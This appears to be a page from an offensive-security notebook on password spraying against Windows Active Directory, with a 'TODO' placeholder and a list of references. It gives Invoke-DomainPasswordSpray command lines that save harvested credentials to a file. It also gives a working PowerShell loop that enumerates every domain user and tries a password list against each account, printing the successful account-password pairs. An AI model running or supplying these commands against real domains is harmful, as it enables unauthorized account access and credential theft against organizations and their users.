---
author(s):
  - Userware
tags:
  - post-exploitation
  - privilege-escalation
  - password-cracking
  - password-spraying
  - offensive-tools
  - windows
---
# Scripts

## DomainPasswordSpray

TODO: Fill this info

Perform automated user enumeration then password spray process when executing from the current domain.

```
PS C:\> Invoke-DomainPasswordSpray -Password <password> -OutFile credentials.txt
```

Specifying a password list then check for [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x00 - Enumeration and Discovery/Desktop/Windows/Host/0xA - Users/Manual/Living off the Land|account lockout observation window]].

```
PS C:\> Invoke-DomainPasswordSpray -PasswordList passwords.lst -OutFile credentials.txt
```

https://pwn.no0.be/exploitation/password/account_lockout/

```
PS C:\> Invoke-DomainPasswordSpray -Domain <DOMAIN> -UserList users.lst -Password <password> -OutFile credentials.txt
```

## SANS

```powershell
dsquery.exe user -limit 0 > users.txt
foreach ($FDN in Get-Content .\users.txt) {
    $results = dsget.exe user $FDN -samid
    $samid = $results[1].replace(" ", "")
    Write-Output $samid
    foreach ($password in Get-Content .\password.txt) {
        $password = $password.replace(" ", "")
        dsget.exe user $FDN -u $samid -p $password > $null
        if ($?) {
            Write-Output "Account: $samid\tPassword $password"
        }
    }
}
```

---
## References

### Github

- [dafthack: DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)

### SANS

- [SANS: Usernames Matter More than Passwords](https://web.archive.org/web/20111008220143/https://it-audit.sans.org/blog/2011/09/21/usernames-matter-more-than-passwords)

### Pwnage Base

- [Pwnage Base: Password Spray](https://pwn.no0.be/exploitation/password/smb/)

### Hacking Articles

- [Hacking Articles: Comprehensive Guide on Password Spraying Attack](https://www.hackingarticles.in/comprehensive-guide-on-password-spraying-attack/)